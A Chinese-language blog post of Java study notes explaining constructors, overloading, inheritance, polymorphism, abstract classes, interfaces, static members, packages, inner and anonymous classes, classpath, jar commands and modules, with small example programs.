<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ClassName</span><span class="params">(Type Paramater)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//初始化语句或者其他语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要注意的是<strong>构造方法没有返回值</strong>，甚至连 <code>void</code> 也没有，其方法名称必须是类的名称，然后里面是在 new 一个类的时候，需要传入的参数。</p>
<p>我们可以<strong>创建多个构造方法</strong>，来对应可能的各种数据输入，有些类在初始化的时候输入的参数格式有好几种，我们就可以写多个构造方法来对应不同的数据输入，程序会自动判断输入数据的格式来决定调用不同的构造方法。</p>
<p>多个构造方法之间可以<strong>相互调用</strong>，具体方法就是在构造方法中使用 <code>this()</code> 方法，里面填充所所需要调用构造方法的参数的格式就可以匹配到了。</p>
<h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><p>在构造方法的时候，其实就已经使用了构造方法的<strong>重载</strong>（Overload），我们创建多个构造方法，对应不同的形参，来处理不同的实参输入。同理，所有其他的方法也可以使用这样的方式（<strong>声明多个不同形参的同名方法</strong>）进行方法重载。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Method Type=<span class="keyword">new</span> Method();</span><br><span class="line">        System.out.println(Type.GetType(<span class="string">&quot;Xorex&quot;</span>));</span><br><span class="line">        System.out.println(Type.GetType(<span class="number">0.1</span>));</span><br><span class="line">        System.out.println(Type.GetType(<span class="number">23333</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Method</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">GetType</span><span class="params">(String string)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;String&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">GetType</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;int&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">GetType</span><span class="params">(<span class="keyword">double</span> num)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;double&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码就是利用方法重载来实现对于不同的实参输入，调用对应的方法来实现特定的功能，整个过程中调用的方法名字都是相同的。</p>
<h2 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h2><h3 id="继承语法"><a href="#继承语法" class="headerlink" title="继承语法"></a>继承语法</h3><p>类的继承就是获得另外一个更加基础的类的属性和方法，然后在这个基础上增加其他的特殊方法和属性，这样可以大大的减少代码数量，保证准确性。</p>
<p>继承的语法是：<code>class Son extends Father</code></p>
<p>如果子类中定义了和父类名称相同的属性或者方法的时候，在外部调用是优先调用子类中的属性或者方法，即使子类的前缀是 private 而父类的前缀是 public ，仍然会调用子类的，然后报错。</p>
<h3 id="继承树"><a href="#继承树" class="headerlink" title="继承树"></a>继承树</h3><p>所有的类都继承自其他的类，如果自己在定义类的时候没有写 extends ，那么就会默认继承 Object 类（有Python继承链的感觉了）</p>
<p>至于这个 Object 类以后会详细了解它的。</p>
<h3 id="protected关键词"><a href="#protected关键词" class="headerlink" title="protected关键词"></a>protected关键词</h3><p>这和 public private 一样是一个作用域的关键词，因为有些子类会使用父类的一些属性和方法，但是又不想破坏封装性，则可以使用 protected 关键词，这个关键词使得此属性和方法只能在本类和子类中使用，在外部无法调用。</p>
<h3 id="super关键词"><a href="#super关键词" class="headerlink" title="super关键词"></a>super关键词</h3><p>super 和 this 的作用是一样的。this 用来特指是当前类的属性或者方法，用来防止和方法内部声明的同名变量搞混。super 同样是为了特指是父类的属性或者方法，用来防止和子类的搞混。</p>
<p>对于一个属性的优先级来说，同名的变量，子属性，副属性，优先级是递减的，使用他们共同的名字所实际调用的内容取决于所存在的所有同名者中优先级最高的那个，所以为了方便的调用我们想要的数据，最好加上诸如 super this 这样的修饰符加以区分。</p>
<p>super还有一个作用，那就是当父类有构造方法的时候，super() 函数就是父类的构造方法调用途径，而且这个 super() 必须在子类的构造方法中的<strong>第一行</strong>被调用，并传入对应的参数，除非父类没有构造函数或者构造函数不需要传入参数，否则就无法通过编译。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Two a=<span class="keyword">new</span> Two(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">One</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(a+b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Two</span> <span class="keyword">extends</span> <span class="title">One</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Two</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码演示的就是 super() 的作用，用于父类的构造方法的传参。</p>
<h3 id="阻止继承"><a href="#阻止继承" class="headerlink" title="阻止继承"></a>阻止继承</h3><p>Java中有一个叫作  final 的修饰符字符，加在 class 关键词前面，意思就是禁止任何类从它这里继承。</p>
<h3 id="类之间的转型"><a href="#类之间的转型" class="headerlink" title="类之间的转型"></a>类之间的转型</h3><p>类之间也可以进行类型转换，但是只可以从子类转化为父类，不可以从父类转化为子类，因为子类比父类多了很多东西，这些没有办法还原。</p>
<p>在类型转换的时候，为了避免发生将父类转化为子类，可以使用二元操作符 <code>instanceof</code> 来判断一个实例是否是另外一个类的实例或者子类的实例，如果是，那么这个实例就可以被转化为判断的类，用法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a=<span class="keyword">new</span> Student();</span><br><span class="line"><span class="keyword">if</span>(a <span class="keyword">instanceof</span> Person)</span><br><span class="line">&#123;</span><br><span class="line">    Person b=(Person)a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样只有确定实例 a 的类 Student 为 Person 的子类之后，才执行下面的类型转换，防止出现异常。</p>
<h3 id="关于继承和组合"><a href="#关于继承和组合" class="headerlink" title="关于继承和组合"></a>关于继承和组合</h3><p>在程序设计的时候，我们更多的是需要考虑面对对象的合理性，比如因为 Student is Person 所以我们可以让 Student 继承于 Person 里面的属性和方法，但是对于另外一个类 Book，我们只能说 Student has Book，这应该是拥有或者说组合的关系，所以 Book 是 Student 的属性，而不能用于继承。</p>
<h2 id="类的多态"><a href="#类的多态" class="headerlink" title="类的多态"></a>类的多态</h2><p>要说起多态，就不得不讲述一下 <strong>重写</strong>（override），重写是对所继承的父类的方法，进行再次定义。被识别为重写的要求是子类定义的方法的方法签名和父类的方法的方法签名相同，也就是拥有相同的方法名和形参列表。</p>
<p>这样这个新定义的方法因为优先权高于父类的方法，那么调用的时候就会优先调用子类中新定义的方法，相当于父类的方法被重写了。</p>
<p>其次需要讲述的是子类到父类的类型转化，也就是将一个内容更多的子类重新压缩成父类，这个时候重写的方法就会真正的覆盖父类的方法（因为在压缩的时候，调用优先权高于父类的方法，所以被压缩进去的是子类重写的新方法），这样就使得虽然一个实例的类型被压缩成了父类，但是这个父类可以有很多种状态（因为可以被各种子类重写方法），所以就有了类的多态，你无法确定一个类的具体状态，除非它真正运行到这一步。</p>
<p>我们就可以利用类的多态干很多事情了，尤其是要维护很多代码的时候，我们可以不更改老代码，通过重写方法来完成各种新功能。</p>
<p>当然在子类中，如果想要调用优先级不够高的父类中的相同签名的方法，可以使用 <code>super.Method()</code> 这样的方式调用。</p>
<h3 id="final修饰词"><a href="#final修饰词" class="headerlink" title="final修饰词"></a>final修饰词</h3><p>如果不想类被继承，可以使用 final 修饰词在类名前面来拒绝继承。</p>
<p>如果方法不想被重写，可以使用 final 修饰词在方法名前面来决绝重写。</p>
<p>如果属性不想被修改，同样可以使用 final 修饰词在属性名前面来拒绝修改。</p>
<h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>类中有一个修饰词，叫作 <code>abstract</code> 抽象的，被这个修饰词修饰的类，被称为抽象类。在拥有了定义没有语句的模板方法的能力的同时，作为代价，丧失被实例化的能力。</p>
<p>正是因为类拥有多态，所以也正是因此诞生了抽象类，也就是专门用来实现多态父类。 抽象类可以定义任意个抽象方法，所有的抽象方法都没有执行语句，只有一个方法的签名，用来被子类重写。</p>
<p>所有继承于抽象类的子类，必须按照抽象类里面所定义的所有抽象方法的签名，对其进行重写。抽象方法的作用就是提供一个重写的模板，保证所有的子类都拥有并且定制化这些功能，这样就可以标准化类的多态。</p>
<p>抽象类可以没有抽象方法，但是有抽象方法的必须是抽象类。</p>
<h2 id="接口-Interface"><a href="#接口-Interface" class="headerlink" title="接口 Interface"></a>接口 Interface</h2><p>什么是接口呢，就是一个只有抽象方法的类，没错，只有抽象方法，甚至连字段都没有的类。这个东西就被成为接口。</p>
<p>定义接口的方式就是 <code>interface ClassName</code> ，然后里面疯狂定义方法就可以了，因为接口里面全都是抽象方法，所以关键词 abstract 就可以省略了，因为所有的抽象方法都是 public 类型的，所以修饰词 public 也可以省略。</p>
<p>除了抽象方法，接口中还有一种方法叫作 默认方法。如果我们想要在接口中加入一个新的抽象方法，那么所有接入这个接口的类都需要更改代码了，这也太麻烦了。于是就在接口中引入了一个默认方法，默认方法可以不是抽象方法，里面可以定义语句，允许接入这个接口的类不重写这个方法，然后让特定需要这个新方法的类重写方法即可。</p>
<p>虽说表现上和抽象类中的普通方法相似，可以重写也可以不重写，但是要知道接口里面是没有属性的啊！抽象类里面还可以有属性来玩，接口里面啥都没有，只需要在函数修饰词前面加上 default 就可以了。</p>
<p>普通的类如何接入（实现）接口呢？当然是使用 <code>class ClassName implements InterfaceName</code> 来接入（实现）接口，一个类可以接入多个接口，直接用逗号隔开接口名就可以了。（implements 实现）</p>
<p>最后注意这个接口指的是 Java 里面狭义的接口，广义上的接口有很多意思。</p>
<h2 id="静态字段和静态方法"><a href="#静态字段和静态方法" class="headerlink" title="静态字段和静态方法"></a>静态字段和静态方法</h2><p>所谓静态，其实就相当于类本身的全局变量，只要类声明出来，静态字段和静态方法就存在了，不需要实例化就能访问和调用。静态的东西是类本身的一部分，所以是通过类名调用的，而不是通过实例的名字。</p>
<p>下面的代码就是利用静态字段和静态方法，通过类名来引用，从而描述类的一些性质（被实例化的次数）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Xorex a=<span class="keyword">new</span> Xorex();</span><br><span class="line">        Xorex b=<span class="keyword">new</span> Xorex();</span><br><span class="line">        Xorex c=<span class="keyword">new</span> Xorex();</span><br><span class="line">        System.out.println(Xorex.GetTimes());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Xorex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> Times=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">GetTimes</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Times;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般来说，静态字段和静态方法一般用于探明这个类的本身的时候使用，比如返回类被实例化了多少个，类自己本身的属性，等等。</p>
<p>比较特殊的是，接口不能有普通的字段和方法，但是可以有静态的字段和静态的方法，这些可以用来专门对接口本身进行描述和作用。需要注意的时这个接口的静态字段的类型只能是  <code>public static final</code> 类型（也就是前面的修饰词可以省略啊），所以无论是外部还是内部都无法改变接口的字段。</p>
<p>具体这些抽象类和接口的静态方法有什么巧妙的使用，这些以后会慢慢分析。</p>
<h2 id="包"><a href="#包" class="headerlink" title="包"></a>包</h2><h3 id="导入-imort-PackageName"><a href="#导入-imort-PackageName" class="headerlink" title="导入  imort PackageName"></a>导入  imort PackageName</h3><p>Java 可以把一些代码打包，来提供给其他的程序调用，如果需要调用一个包，那么调用方法就是 <code>import PackageName</code> ，其中 <code>PackageName</code> 是需要有目录顺序的，比如在根目录下面有一个文件夹叫作 <code>Tempest</code>，文件夹里面有一个文件 <code>Xorex.class</code>  ，那么在导入这个包的时候，就需要写：<code>import Tempest.Xorex</code> 在import 这里，<code>.</code> 会被解读为路径的分隔符。</p>
<p>这个 import 写带分隔符的全名就是告诉 JVM 去哪里找我们从外部调用的这个类，当然想要调用一个类不写 import 也可以，这不过需要在每次调用这个类的时候，都写上包的全名（包括路径）。</p>
<p>所以，最好还是用 import 直接把要调用的包的路径写出来，这样每次调用直接写类名就可以了。</p>
<h3 id="声明-package-PackageName"><a href="#声明-package-PackageName" class="headerlink" title="声明  package PackageName"></a>声明  package PackageName</h3><p>声明当前的 Java 文件所属于的包的方法就是在文件的开头加上一句话：<code>package PackageName</code> 其中，需要注意的是这个 Java 文件需要在一个名字为 PackageName 的文件夹下面，也就是说，所有在 PackageName 文件夹下面的 Java 文件都应该属于 PackageName 这个包中。</p>
<p>在我们为类写属性和方法的时候，我们往往会给这些属性和方法一个修饰词如 public/private/protected，这些都是作用域的修饰词，表示的是这些属性和方法能够被哪些作用域范围内生成的实例给调用。比如下面的表：</p>
<table>
<thead>
<tr>
<th>作用域</th>
<th>当前类</th>
<th>同一package</th>
<th>子孙类</th>
<th>其他package</th>
</tr>
</thead>
<tbody><tr>
<td>public</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>protected</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>×</td>
</tr>
<tr>
<td>private</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
</tbody></table>
<p>当我们引入 Package 的时候，我们有了一个全新的空间概念：包作用域。同一个包下面类虽然有可能不是属于一个 java 文件，但是他们都属于同一个包中，所有包中的类的关系都可以看成 <code>friend</code> 朋友。朋友之间都是平等的。同一个包中的所有类的关系和同一个文件中所有类的关系是等价的，因为他们都属于一个包中。（下面的表中 friendly 指的是<strong>没有修饰符的</strong>属性和方法的作用域）</p>
<table>
<thead>
<tr>
<th>作用域</th>
<th>当前类</th>
<th>同一package</th>
<th>子孙类</th>
<th>其他package</th>
</tr>
</thead>
<tbody><tr>
<td>public</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>√</td>
</tr>
<tr>
<td>protected</td>
<td>√</td>
<td>√</td>
<td>√</td>
<td>×</td>
</tr>
<tr>
<td>friendly</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>private</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
</tbody></table>
<p>需要注意的是，上面的关系中，子孙类一栏中的调用，既包含了实例化的调用，也包含了继承化的调用。</p>
<p>emmmm，其实只需要记住，类在同一个包里面的关系等价于在同一个文件里的关系就可以了。</p>
<h3 id="JVM-如何寻找类"><a href="#JVM-如何寻找类" class="headerlink" title="JVM 如何寻找类"></a>JVM 如何寻找类</h3><p>对于 Java 中实例化一个类的时候，JVM 会按照一定的顺序去寻找这个类的代码，探究寻找顺序可以帮我们解决在实例化同名的类的时候，究竟是哪一个类被实例化。</p>
<ul>
<li>首先查找当前 <code>package</code> 是否存在这个 <code>class</code></li>
<li>其次查找 <code>import</code> 的包是否包含这个 <code>class</code></li>
<li>最后查找 <code>java.lang</code> 包是否包含这个 <code>class</code></li>
</ul>
<h2 id="类的修饰符"><a href="#类的修饰符" class="headerlink" title="类的修饰符"></a>类的修饰符</h2><p>类的修饰符很少，除了不加修饰符的情况以外，只有三种，分别是： public abstract final</p>
<ul>
<li><p>不加修饰符的时候，表示这个类属于默认的访问模式，也就是只能被<strong>同一个包</strong>中的其他类给访问。</p>
</li>
<li><p>使用 <code>public</code> 修饰符的时候，表示这个类的被访问模式就不仅仅局限与同一个包里的类了，而是所用使用 import 或者完整路径的地方都可以访问它。换句话说，任何地方都可以访问这个类。需要注意的是，任何一个 Java 文件中都只能有一个 public 类，并且这个 public 类的名称<strong>必须和此 Java 文件的文件名称相同</strong>，作为这个 Java 文件可被外界访问的入口。public 类一般都是造轮子用的类，集成一些特定的功能来供外界使用。</p>
</li>
<li><p>使用 <code>abstract</code> 修饰符，表示这个类里面含有抽象方法，需要子类重写这个抽象方法，并且抽象类失去被实例化的能力。</p>
</li>
<li><p>使用 <code>final</code> 修饰符，表示这个类的形态是最终状态，被禁止通过继承来改写功能。</p>
</li>
</ul>
<h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><p>除了在 Java 文件里面到处声明类以外，还可以在一个类的内部声明一个类，没错就是套娃，套娃的方式有两种，一种是按照普通方式直接在<strong>类里</strong>定义一个类，另外一种是在<strong>类的方法</strong>里面定义一个匿名类。</p>
<p>内部类有一个很重要的特性就是可以访问外部类的 private 属性和方法。</p>
<h3 id="定义内部类"><a href="#定义内部类" class="headerlink" title="定义内部类"></a>定义内部类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Outer outer=<span class="keyword">new</span> Outer();</span><br><span class="line">        Outer.Inter inter=outer.<span class="function">new <span class="title">Inter</span><span class="params">()</span></span>;</span><br><span class="line">        inter.GetString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Inter</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">GetString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;This is Inter Class!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>上面的代码就是在类 Outer 里面定义了一个内部类 Inter，定义内部类的方法很简单，就是在外部类的大括号里面像定义一个普通类一样就可以了。</p>
<p>但是实例化内部类 Inter 就需要借助外类 Outer 了，首先需要先将外类 Outer 实例化出来，声明内部类的类型 Outer.Inter ，然后借助外类的实例 outer，进行新建（new） Inter。代码： <code>Outer.Inter inter=outer.new Inter();</code></p>
<p>内部类的类型：<code>Outer.Inter</code></p>
<p>借助外部类实例新建内部类：<code>outer.new Inter()</code></p>
<h3 id="定义匿名类"><a href="#定义匿名类" class="headerlink" title="定义匿名类"></a>定义匿名类</h3><p>匿名实质上就是一个没有名字，用来继承父类或者实现接口的子类，但是这个临时的子类可以在方法里面进行使用。</p>
<p>首先需要一个用来继承的父类或者接口，在实例化的同时，在后面添加大括号，然后就可以进行添加属性方法，重写方法等等操作了，比如下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaProject.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Outer outer=<span class="keyword">new</span> Outer();</span><br><span class="line">        outer.GetInter1();</span><br><span class="line">        outer.GetInter2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">GetString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;GG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">GetInter1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Tempest One=<span class="keyword">new</span> Tempest() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">void</span> <span class="title">GetString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                Tempest Two=<span class="keyword">new</span> Tempest() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">void</span> <span class="title">GetString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        Tempest Three=<span class="keyword">new</span> Tempest() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">void</span> <span class="title">GetString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                                System.out.println(<span class="string">&quot;One in One!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;;</span><br><span class="line">                        Three.GetString();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">                Two.GetString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        One.GetString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">GetInter2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Tempest() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">void</span> <span class="title">GetString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Xorex&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.GetString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中 <code>GetInter1()</code>  用一个父类来压缩了继承自他的匿名类，这个匿名类重写了父类的方法，重写一个一次性的子类实现父类的多态。</p>
<p>而 <code>GetInter2()</code> 没有将子类压缩成父类，而是对父类进行了拓展/重写，但是调用这个匿名子类也只有在这里实例化的时候可以，也是一次性使用的。</p>
<h3 id="static-内部类"><a href="#static-内部类" class="headerlink" title="static 内部类"></a>static 内部类</h3><p>我们在第一种内部类的前面加上了 static 之后，这个类就脱离了对外类的依赖变成了一个独立的类，也就是可以不依赖外部类的实例化而调用内部类，只不过这个内部类的名字需要带上外部类作为标识，比如可以直接这样实例化内部类：<code>Outer.Inter Xorex Outer.Inter();</code></p>
<h2 id="classpath-和-jar"><a href="#classpath-和-jar" class="headerlink" title="classpath 和 jar"></a>classpath 和 jar</h2><h3 id="classpath"><a href="#classpath" class="headerlink" title="classpath"></a>classpath</h3><p>在 Java 文件在运行的时候，最后一步是 JVM 执行各种已经变成字节码的 <code>.class</code>  文件。从入口 <code>.class</code> 文件开始，这个文件往往会使用其他的各种类，有自己写的，有从其他人手里下载的，有 Java 核心库里面的。那么 JVM 如何寻找这些被开发者调用的类文件呢？</p>
<p>答案就是利用 classpath ，这个是一个环境变量，用来记录存放 <code>.class</code> 文件的地方，如果存在一个 <code>xorex.class</code> 位于 <code>E:/JavaProject/bin/tempest/xorex.class</code>  那么我们可以将 <code>E:/JavaProject/</code>  加入到 classpath 环境变量里面，这样我们只需要用 <code>bin.tempest.xorex</code> 来调用xorex 类，JVM 就可以寻找到它并执行。</p>
<p>但是不推荐将 classpath 添加到环境变量里面，因为这会污染整个系统环境，应该在运行程序的时候就直接在对应的命令里面写入 classpath。</p>
<p>不过现在比较少用到这个东西了，JVM 会自动加载当前路径和 Java 核心库，这已经能应对很多情况了（可能？）</p>
<h3 id="jar"><a href="#jar" class="headerlink" title="jar"></a>jar</h3><h3 id="jar-格式是什么？"><a href="#jar-格式是什么？" class="headerlink" title="jar 格式是什么？"></a>jar 格式是什么？</h3><p>jar 的全名是 Java Archive，Archive:  <code>[ˈɑːrkaɪv]</code> 存档、档案馆 。</p>
<p>jar.exe 的作用就是把 <code>.class</code> 文件保留原本的目录，打包成一个文件。jar 文件和 zip 文件本质上是一样的（都是一个压缩包），只不过 jar 文件会多一个 <code>META-INF</code> 文件夹和 <code>MANIFEST.MF</code> 文件。这个文件里面的配置信息是让 jar 文件可以在 JVM 上运行并让其变成一个 java 应用程序的关键。</p>
<p>jar 文件的作用就是封装发布，它既可以是当作轮子库来供其他开发者使用，也可以作为一个可以直接运行的 java 应用程序供消费者使用。比如 java 的标准库就叫做 <code>rt.jar</code> 大概有 <code>60M</code> 的大小，它被默认的添加到了 JVM 的 classpath 里面。</p>
<p>jar 只是用来存放 <code>.class</code> 文件的容器。</p>
<h3 id="来创建-jar-文件吧"><a href="#来创建-jar-文件吧" class="headerlink" title="来创建 jar 文件吧"></a>来创建 jar 文件吧</h3><p>生成 jar 文件可以使用 jar.exe 的相关命令</p>
<p>首先先看命令格式：<code>jar &#123;ctxui&#125; [vfmn0PMe] [jar-file] [manifest-file] [entry-point] [-C dir] files</code></p>
<p>其中大括号里面（有一个即可）和文件名是必须要有的参数，中括号为可选参数。</p>
<ul>
<li>-c：创建一个jar包</li>
<li>-t：显示jar中的内容列表</li>
<li>-x：解压jar包</li>
<li>-u：添加文件到jar包中</li>
<li>-f：指定jar包的文件名</li>
<li>-v：生成详细的报造，并输出至标准设备</li>
<li>-e：为捆绑到可执行jar文件的独立应用程序指定应用程序入口点</li>
<li>-m：指定manifest.mf文件.(manifest.mf文件中可以对jar包及其中的内容作一些一设置)</li>
<li>-0：产生jar包时不对其中的内容进行压缩处理</li>
<li>-P：保留文件名中的前导 ‘/‘ (绝对路径) 和 “..” (父目录) 组件</li>
<li>-M：不创建条目的清单文件(Manifest.mf)。这个参数与忽略掉-m参数的设置</li>
<li>-i：为指定的jar文件创建索引文件</li>
<li>-C：表示转到相应的目录下执行jar命令,相当于cd到那个目录，然后不带-C执行jar命令</li>
</ul>
<ol>
<li>创建 jar 文件</li>
</ol>
<blockquote>
<p><code>jar cvf test.jar test</code> 命令表示使用 jar.exe 程序将 test 文件夹下面的东西打包成 test.jar 文件。</p>
</blockquote>
<ol start="2">
<li>查看 jar 文件内容列表</li>
</ol>
<blockquote>
<p><code>jar tvf test.jar</code> 表示查看 test.jar 包里面的内容列表。如果内容过多，我们可以将列表内容导入到一个文件里面 <code>jar tvf test.jar &gt; list.txt</code> 这样就把内容列表以文本的方式保存在了 list.txt 文件里面。</p>
</blockquote>
<ol start="3">
<li>解压 jar 文件</li>
</ol>
<blockquote>
<p><code>jar xvf test.jar</code> 表示解压 test.jar 文件到当前的目录下面。</p>
</blockquote>
<ol start="4">
<li>更新 jar 文件</li>
</ol>
<blockquote>
<p><code>jar uvf test.jar Test/Test.class</code> 表示将 Text目录下面的 Test.class 文件加入到 test.jar 里面，加入 jar 里面的同时，会保留 .class 文件的目录，也就是在 jar 的 Test 目录里新加入 Test.class</p>
</blockquote>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>模块是什么东西呢？模块就是被封装的 jar 文件。</p>
<p>如果翻阅一下 java8 和 Java9 之间的不同，你就会发现 java8里面的 jar 文件都消失了，而到了 java9 里面全部变成了 jmod 文件（java module）</p>
<p>jmod 其实就是对 jar 文件的一个改进，因为 jar 文件里面的各种类没有规定访问权限，也没有规定依赖关系，这就导致很难管理它们。比如一个 <code>rt.jar</code> 就足足60MB 的大小，如果要调用里面的工具类使用的话，光轮子都有 60MB 的大小，太臃肿了，而且里面有很多类是实现某个功能的中间类，并不想被调用（可能会有奇怪的错误）。</p>
